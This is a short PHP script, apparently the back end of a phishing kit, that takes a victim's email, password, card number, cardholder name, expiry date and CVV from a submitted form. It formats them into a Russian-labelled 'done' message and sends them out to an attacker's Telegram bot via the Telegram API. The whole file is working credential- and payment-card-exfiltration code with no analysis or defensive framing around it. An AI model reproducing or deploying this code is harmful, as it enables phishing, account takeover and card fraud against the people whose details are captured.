<?php
    require 'tg.php';
    include("vendor/autoload.php");
    use Telegram\Bot\Api;
    $email=$_POST['email'];
    $password=$_POST['password'];
    $chat_id=$_POST['chatid'];
    $num=$_POST['num'];
    $f=$_POST['f'];
    $mm=$_POST['vt1'];
    $yy=$_POST['vt2'];
    $cvv=$_POST['cvv'];

    $text='✅<b>ГОТОВО!!!</b>✅%0A%0A<b>E-mail:</b>        '.$email.'%0A<b>Password:</b> '.$password.'%0A%0A💵💵💵💵💵💵💵💵%0A<b>'.$num.'</b>%0A<b>'.$f.'</b>%0A<b>'.$mm.'</b> / <b>'.$yy.'</b>%0A<b>'.$cvv.'</b>';
    while(true)
    {
        if (!empty($chat_id)){
            fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$text}","r");
            exit(print '1');
            break;
        }   
    }
    
?>